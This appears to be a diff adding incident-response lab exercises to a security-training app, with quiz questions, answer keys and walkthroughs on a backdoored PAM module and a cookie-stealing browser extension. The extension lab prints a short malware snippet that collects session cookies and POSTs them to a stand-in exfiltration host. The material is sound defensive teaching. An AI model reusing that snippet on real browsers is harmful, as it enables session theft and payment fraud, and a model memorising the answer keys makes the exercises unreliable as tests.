+        correctIndex: 2,
+        hint: 'Tokens are bearer credentials.',
+        walkthrough: 'Revoking tokens stops ongoing access. Password resets do not necessarily invalidate issued access tokens. The download logs define the data exposure.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Fix the integration',
+        evidence: r`Remediation plan
+- Exact-match redirect URIs
+- Move client to authorization code + PKCE; disable implicit flow
+- Short token lifetimes; require state parameter`,
+        question: 'Why is the state parameter included?',
+        options: [
+          'It replaces PKCE',
+          'It encrypts the token',
+          'It ties the callback to the session that started the flow, preventing CSRF-style login and response injection',
+          'It sets the user\'s region',
+        ],
+        correctIndex: 2,
+        hint: 'It is a nonce for the authorization request.',
+        walkthrough: 'State protects the client against forged authorization responses. Combined with exact redirect matching and PKCE, the flow follows current OAuth best practice.',
+      },
+    ],
+  },
+  {
+    id: 'lab-60',
+    title: 'Backdoored PAM Module on Linux Servers',
+    domain: 5,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'Two Linux bastion hosts show successful SSH logins for a service account whose password was rotated yesterday. The new password was never shared. Investigate the authentication stack for tampering.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Check package integrity',
+        evidence: r`$ rpm -Va | grep -E 'pam|ssh'
+S.5....T.    /usr/lib64/security/pam_unix.so
+$ ls -l --time-style=full-iso /usr/lib64/security/pam_unix.so
+-rwxr-xr-x 1 root root 68240 2026-10-20 02:14:51 pam_unix.so`,
+        question: 'What does S.5....T. mean for pam_unix.so?',
+        options: [
+          'Only permissions changed',
+          'The file is fine',
+          'The file\'s size, checksum, and modification time differ from the installed package, so it was modified',
+          'The package was upgraded normally',
+        ],
+        correctIndex: 2,
+        hint: 'Each letter flags a different attribute.',
+        walkthrough: 'rpm -Va compares files to package metadata. S is size, 5 is digest, T is mtime. A modified pam_unix.so is a known backdoor technique: it can accept a hardcoded password and log real ones.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Look inside the module',
+        evidence: r`$ strings /usr/lib64/security/pam_unix.so | grep -iE '/tmp|/var|\.log|pass' | head
+/var/tmp/.font-unix/.cache
+password check failed for user (%s)
+$ ls -la /var/tmp/.font-unix/
+-rw------- 1 root root 4021 .cache`,
+        question: 'What is the likely purpose of /var/tmp/.font-unix/.cache?',
+        options: [
+          'A hidden file where the backdoored module records captured usernames and passwords',
+          'A font cache',
+          'A normal PAM debug log',
+          'A Kerberos ticket',
+        ],
+        correctIndex: 0,
+        hint: 'The path does not belong in a PAM module.',
+        walkthrough: 'Malicious PAM modules often write credentials of every login to a hidden file. Treat every account that logged in to this host since 10-20 as exposed. Preserve the file as evidence but avoid spreading its contents.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Confirm the access path',
+        evidence: r`/var/log/secure
+Oct 21 03:12:07 bastion1 sshd[2210]: Accepted password for svc_deploy from 198.51.100.150 port 51122
+Oct 20 02:13:30 bastion1 sshd[1984]: Accepted publickey for ops_admin from 10.0.5.4
+Oct 20 02:14:51 (module replaced)`,
+        question: 'How did the attacker likely gain the first foothold?',
+        options: [
+          'Through ops_admin\'s session right before the module was replaced, so that account and its key are part of the compromise',
+          'Through svc_deploy\'s new password',
+          'Through physical access',
+          'Through a DNS attack',
+        ],
+        correctIndex: 0,
+        hint: 'What happened one minute before the change?',
+        walkthrough: 'The module changed one minute after an ops_admin login from an internal host. Investigate 10.0.5.4 and ops_admin\'s key. svc_deploy\'s later login likely used the module\'s master password.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Eradicate',
+        evidence: r`Options
+A) Reinstall the pam package and restart sshd
+B) Rebuild both bastions from a trusted image, rotate all credentials used on them, and replace SSH host keys
+C) Delete the .cache file`,
+        question: 'Which option is appropriate?',
+        options: [
+          'A only',
+          'B, because root-level tampering means other changes may exist and every credential used on the host is exposed',
+          'C only',
+          'Keep the hosts running to watch the attacker',
+        ],
+        correctIndex: 1,
+        hint: 'How much do you trust a host where root was compromised?',
+        walkthrough: 'With root access the attacker could have changed other binaries, cron jobs, or kernel modules. Rebuilding is the reliable path. All passwords entered on the host since the change are compromised.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Detect future tampering',
+        evidence: r`Monitoring additions
+- File integrity monitoring on /usr/lib64/security, /etc/pam.d, /usr/sbin/sshd
+- auditd: -w /etc/pam.d -p wa -k pam_changes
+- Alert on successful logins for accounts outside the change window`,
+        question: 'Why watch /etc/pam.d as well as the modules?',
+        options: [
+          'PAM configs never change',
+          'An attacker can also add a malicious or permissive line to PAM configs instead of replacing a module',
+          'It is the only place modules live',
+          'To track font changes',
+        ],
+        correctIndex: 1,
+        hint: 'Configuration and code are both attack surface.',
+        walkthrough: 'A single pam_permit line can bypass authentication. FIM on modules and configs, plus auditd write watches, catch both forms of tampering.',
+      },
+    ],
+  },
+  {
+    id: 'lab-61',
+    title: 'Malicious Browser Extension Stealing Sessions',
+    domain: 5,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'Finance staff report that their SaaS accounting app logs them out at random and a vendor payment was edited by "them" when they were offline. All affected users installed the same "PDF Quick Converter" Chrome extension last week.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Review the extension\'s permissions',
+        evidence: r`manifest.json (PDF Quick Converter v2.4.1)
+"permissions": ["cookies", "tabs", "storage", "webRequest"],
+"host_permissions": ["<all_urls>"],
+"background": {"service_worker": "bg.js"}`,
+        question: 'Why are these permissions alarming for a PDF converter?',
+        options: [
+          'Access to cookies and all URLs lets it read session cookies for every site the user visits, far beyond what a converter needs',
+          'They are standard for all extensions',
+          'They only allow PDF access',
+          'Storage permission lets it delete files',
+        ],
+        correctIndex: 0,
+        hint: 'Does a converter need cookies from every site?',
+        walkthrough: 'Cookies plus all host permissions means the extension can read and export authenticated sessions for any site. Overbroad permissions on a utility extension are a strong warning sign.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Analyze the code',
+        evidence: r`bg.js (deobfuscated excerpt)
+chrome.cookies.getAll({domain: "books.saas-acct.example"}, c =>
+  fetch("https://cdn-pdfconv.example/v", {method:"POST", body: JSON.stringify(c)}));
+// triggered on update from v2.3 to v2.4 (2026-10-15)`,
+        question: 'What does the version note tell you?',
+        options: [
+          'The extension was likely benign earlier and became malicious through an update, possibly after the developer account was sold or hijacked',
+          'It was always malicious',
+          'Chrome injected the code',
+          'The SaaS app added the code',
+        ],
+        correctIndex: 0,
+        hint: 'When did the behavior appear?',
+        walkthrough: 'Extensions auto-update. Attackers buy popular extensions or compromise developer accounts and push malicious updates. Users who installed it months ago would not have noticed.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Contain',
+        evidence: r`Affected: 18 users with extension ID ljkpqmn...
+Session cookie exfil destination: cdn-pdfconv.example`,
+        question: 'Which steps contain the incident?',
+        options: [
+          'Change users\' passwords only',
+          'Ask users to uninstall it when convenient',
+          'Force-remove the extension through browser policy, block the domain, revoke all SaaS sessions for affected users, and review account changes',
+          'Clear browser history',
+        ],
+        correctIndex: 2,
+        hint: 'Stolen session cookies work without the password.',
+        walkthrough: 'Removing the extension stops new theft. Revoking SaaS sessions invalidates stolen cookies. Passwords alone may not end existing sessions.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Assess fraud',
+        evidence: r`SaaS audit log
+2026-10-18 01:40  user a.lind  IP 203.0.113.61  vendor "Delta Supplies" bank account changed
+2026-10-18 01:44  user a.lind  IP 203.0.113.61  payment batch approved: 48,200 EUR`,
+        question: 'What is the urgent business action?',
+        options: [
+          'Contact the bank immediately to recall the payment and revert the vendor bank details, and involve finance leadership',
+          'Wait for the end of month reconciliation',
+          'Only disable a.lind\'s account',
+          'Email the vendor to ask if they changed their bank',
+        ],
+        correctIndex: 0,
+        hint: 'Time matters for payment recall.',
+        walkthrough: 'Fast recall requests have the best chance of recovering funds. Revert vendor data from audit history and check all other vendor changes made from attacker IPs.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Prevent recurrence',
+        evidence: r`Chrome enterprise policy options
+- ExtensionInstallAllowlist (approved IDs only)
+- ExtensionInstallBlocklist: *
+- Block extensions requesting cookies + all_urls unless approved`,
+        question: 'What is the strongest control?',
+        options: [
+          'Allow only approved extensions and block all others by default',
+          'Allow everything but educate users',
+          'Block only this extension ID',
+          'Disable Chrome updates',
+        ],
+        correctIndex: 0,
+        hint: 'Default deny beats chasing bad IDs.',
+        walkthrough: 'A default-deny allowlist limits extensions to vetted ones. Review the allowlist when permissions change in updates, since a trusted extension can turn malicious later.',
+      },
+    ],
+  },
 ];
